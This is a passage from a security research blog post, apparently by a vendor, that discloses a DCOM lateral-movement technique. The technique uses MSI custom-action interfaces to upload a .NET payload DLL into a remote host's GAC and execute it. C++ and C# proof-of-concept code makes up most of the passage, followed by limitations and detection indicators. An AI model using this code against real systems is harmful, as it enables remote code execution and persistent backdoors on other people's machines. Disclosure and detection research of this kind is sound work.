// mocGuid1 is the same GUID we created for invoking URTAddAssemblyInstallComponent

hr = pMsiAction->URTCommitAssemblies(mocGuid1, &outIntCommit, &outCharCommit);
```

_Payload.dll_ is now uploaded to:

![fig-19-payload-in-GAC-folder.png](https://www.deepinstinct.com/image/blt88d568668b167da3/6757643fbbb2f6cc0e399940/fig-19-payload-in-GAC-folder.png)Figure 19: payload.dll uploaded to the GAC folder after URTCommitAssemblies

Analyzing each token on this path with accordance to _payload.dll_’s strong name details, we derive the GAC path structure for installed assemblies (valid for .NET version => 4):

_C:\\Windows\\Microsoft.NET\\assembly\\GAC\_\[assembly\_bitness\]\\\[assembly\_name\]\\v4.0\_\[assembly\_version\]\_\_\[public\_key\_token\]\\\[assembly\_name\].dll_

Getting those details from a strong-named DLL can be done using _sigcheck.exe_(Sysinternals) and [sn.exe](https://learn.microsoft.com/en-us/dotnet/framework/tools/sn-exe-strong-name-tool) (.NET Framework tools)

We have managed to install an assembly DLL to a predictable path in the GAC and figure out the path structure. Let's now incorporate our efforts into the attack:

```
// resuming from our last code snippets

// our payload is the dummy .NET payload.dll

// URTCommitAssemblies commits payload.dll to the GAC

hr = pMsiAction->URTCommitAssemblies(mocGuid1, &outIntCommit, &outCharCommit);

std::wstring payload_bitness = L"64"; // our payload is x64

std::wstring payload_version = L"1.0.0.0"; // sigcheck.exe -n payload.dll

std::wstring payload_assembly_name = L"payload";

std::wstring public_key_token = L"136e5fbf23bb401e"; // sn.exe -T payload.dll

// forging all elements to the GAC path

std::wstring payload_gac_path = std::format(L"C:\\Windows\\Microsoft.NET\\assembly\\GAC_{0}\\{1}\\v4.0_{2}__{3}\\{1}.dll", payload_bitness, payload_assembly_name, payload_version,public_key_token);

hr = pMsiAction->LoadEmbeddedDLL(payload_gac_path.c_str(), 0);
```

The updated attack code runs successfully, and to confirm our payload was loaded to the remote MSIEXEC.exe we break into it in Windbg and query:

![fig-20-windbg-confirms-payload-in-GAC.png](https://www.deepinstinct.com/image/blte4d3004314bd577c/6757643fa3d521813151c30a/fig-20-windbg-confirms-payload-in-GAC.png)Figure 20: Windbg confirms payload.dll is loaded from the GAC

Success! But we’re not quite done yet, as .NET assemblies do not have “DllMain” functionality on native processes, so no code is running. There are a couple of possible workarounds, but our solution will be adding an export to our payload.dll assembly. As for calling this export, _IMsiCustomAction_ has us covered once more.

##### Running .NET Exports

As I’ve mentioned, _IMsiCustomAction::LoadEmbeddedDLL_ attempts to resolve some exports after loading a requested DLL and saves the results. When searching for code using the address of the results, we reveal three _IMsiCustomAction_ methods, each invoking a respective export from the loaded DLL:

1. _IMsiCustomAction::CallInitDLL_ **invokes** _InitializeEmbeddedUI_

2. _IMsiCustomAction::CallShutdownDLL_ **invokes** _ShutdownEmbeddedUI_

3. _IMsiCustomAction::CallMessageDLL_**invokes**_EmbeddedUIHandler_

Each method provides different arguments to the respective export, and we will use _IMsiCustomAction::CallInitDLL_ which provides the richest argument set:

```
HRESULT CallInitDLL(ulong intVar, PVOID pVar, ulong* pInt, ulong* pInitializeEmbeddedUIReturnCode);

// CallInitDLL calls InitializeEmbeddedUI with the following args:

DWORD InitializeEmbeddedUI(ulong intVar, PVOID pVar, ulong* pInt)
```

The combination of _ulong intVar_ and _PVOID pVar_ allows us great flexibility running our payload. For example, _PVOID pVar_ can point to a shellcode our payload will execute, and _ulong intVar_ will be its size.

For this POC, we will create a simple implementation of _InitializeEmbeddedUI_ in our _payload.dll_ that displays a message box with attacker-controlled content.

We’ll export _InitializeEmbeddedUI_ [from our assembly to a native caller](https://blog.xpnsec.com/rundll32-your-dotnet/) (msi.dll) with the “ _.export_" IL descriptor

We can now present the final POC of payload.dll:

```
using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using RGiesecke.DllExport; // [DllExport] wraps ".export"

namespace payload

{

 public class Class1

 {

   [DllImport("wtsapi32.dll", SetLastError = true)]

   static extern bool WTSSendMessage(IntPtr hServer, [MarshalAs(UnmanagedType.I4)] int SessionId, String pTitle, [MarshalAs(UnmanagedType.U4)] int TitleLength, String pMessage, [MarshalAs(UnmanagedType.U4)] int MessageLength, [MarshalAs(UnmanagedType.U4)] int Style, [MarshalAs(UnmanagedType.U4)] int Timeout, [MarshalAs(UnmanagedType.U4)] out int pResponse, bool bWait);

   [DllExport]

   public static int InitializeEmbeddedUI(int messageSize,[MarshalAs(UnmanagedType.LPStr)] string attackerMessage, IntPtr outPtr)

   {

    string title = "MSIEXEC - GAC backdoor installed";

    IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;

    // The POC will display a message to the first logged on user in the target

    int WTS_CURRENT_SESSION = 1;

    int resp = 1;

    // Using WTSSendMessage to create a messagebox form a service process at the users desktop

    WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, title, title.Length, attackerMessage, messageSize, 0, 0, out resp, false);

    return 1337;

   }

  }

}
```

And the final lines of our DCOM Upload & Execute attack:

```
// runs after our call to pMsiAction->LoadEmbeddedDLL, loading our payload assembly

ulong ret1, ret2;

std::string messageToVictim = "Hello from DCOM Upload & Execute";

hr = pMsiAction->CallInitDLL(messageToVictim.length(), (PVOID)messageToVictim.c_str(), &ret1, &ret2);
```

Running the complete attack code will pop a message box on the remote target PC:

![fig-21-DCOMUploadExec-commandlie.png](https://www.deepinstinct.com/image/blt1983a99b0f1dbb97/6757644c19cfd53944f09c82/fig-21-DCOMUploadExec-commandlie.png)Figure 21: DCOM Upload and Execute Client Commandline

![fig-22-result-on-target-victim.png](https://www.deepinstinct.com/image/blt2a5e57ba00e31148/6757644ca3d52152cd51c310/fig-22-result-on-target-victim.png)Figure 22: Result on target victim

**For the full source code**: [https://github.com/deepinstinct/DCOMUploadExec](https://github.com/deepinstinct/DCOMUploadExec)

##### Limitations

1. The attacker and victim machines must be in the same domain or forest.

2. The attacker and victim machines must be consistent with the [DCOM Hardening patch,](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c) either with the patch applied on both systems or absent on both.

3. The uploaded & executed assembly payload must have a [strong name](https://learn.microsoft.com/en-us/dotnet/standard/assembly/strong-named)

4. The uploaded & executed assembly payload must be either x86 or x64 (Can't be AnyCPU)


##### Detection

This attack leaves clear IOCs that can be detected and blocked

1. Event logs that contain remote authentication data:


![fig-23-Remote-login-event-log.png](https://www.deepinstinct.com/image/blt8e955e2e7688a48b/6757644c4f07d36e22f31c0a/fig-23-Remote-login-event-log.png)Figure 23: Remote login event log

2. An MSIEXEC service that creates a child (the custom action server) with the command line pattern _C:\\Windows\\System32\\MsiExec.exe -Embedding \[HEXEDICAMAL\_CHARS\]_

![fig-24-proccess-tree-DCOMUploadExec.png](https://www.deepinstinct.com/image/blta4867b08c0c4cad6/6757644c197eca0089cde60e/fig-24-proccess-tree-DCOMUploadExec.png)Figure 24: Process tree during DCOM Upload & Exec

3. The child MSIEXEC writes a DLL to the GAC

4. The child MSIEXEC loads a DLL from the GAC


##### **Summary**

Until now, DCOM lateral movement attacks have been exclusively researched on IDispatch-based COM objects due to their scriptable nature. This blog post presents a complete method for researching COM and DCOM objects without depending on their documentation or whether they implement IDispatch.

Using this method, we expose “DCOM Upload & Execute,” a powerful DCOM lateral movement attack that remotely writes custom payloads to the victim’s GAC, executes them from a service context, and communicates with them, effectively functioning as an embedded backdoor.

The research presented here proves that many unexpected DCOM objects may be exploitable for lateral movement, and proper defenses should be aligned.

If you are concerned about these stealthy attacks breaching your environment, [request a demo](https://www.deepinstinct.com/request-a-demo) to learn how Deep Instinct prevents what other vendors can’t find using the only deep learning framework in the world built from the ground up for cybersecurity.

##### References

1. [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

2. [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

3. [https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)

4. [https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/)

5. [https://www.cybereason.com/blog/dcom-lateral-movement-techniques](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

6. [https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory](https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory)

7. [https://blog.xpnsec.com/rundll32-your-dotnet/](https://blog.xpnsec.com/rundll32-your-dotnet/)

8. [https://www.nuget.org/packages/UnmanagedExports](https://www.nuget.org/packages/UnmanagedExports)

9. [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)


[Back To Blog](https://www.deepinstinct.com/blog)